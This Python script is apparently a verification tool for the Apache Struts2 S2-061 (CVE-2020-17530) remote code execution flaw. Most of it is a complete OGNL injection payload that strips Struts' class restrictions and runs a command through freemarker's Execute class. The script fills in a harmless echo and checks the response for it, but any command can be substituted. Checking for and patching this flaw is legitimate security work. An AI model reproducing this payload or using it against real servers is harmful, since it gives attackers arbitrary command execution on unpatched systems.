#!/usr/bin/env python3

import re
import random
import string
import requests

class S2_061_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-061漏洞,又名CVE-2020-17530漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - Struts 2.5.25',
            'date': '2020-12-08',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'

        self.capta = self.get_capta()
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded"
        }
       
        self.payload = {
            'name': '''%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'cmd_data'}).(#res=#exec.exec(#cmd))}''',
            'age': ''
        }
    
    def get_capta(self):
        
        """
        获取一个随机字符串

        :param:

        :return str capta: 生成的字符串
        """

        capta = ''
        words = ''.join((string.ascii_letters,string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        return capta

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """
        
        try:
            check_payload = {
                'name': self.payload['name'].replace('cmd_data', 'echo ' + self.capta),
                'age': ''
            }
            check_req = requests.post(self.url, data = check_payload, headers = self.headers)
            check_str = re.sub('\n', '', check_req.text)
            result = re.findall('<input type="text" name="name" value=".*? id="(.*?)"/>', check_str)
            if self.capta in result[0]:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_061 = S2_061_BaseVerify('http://localhost:8080/s2_061_war_exploded/index.action')
    print(S2_061.run())
    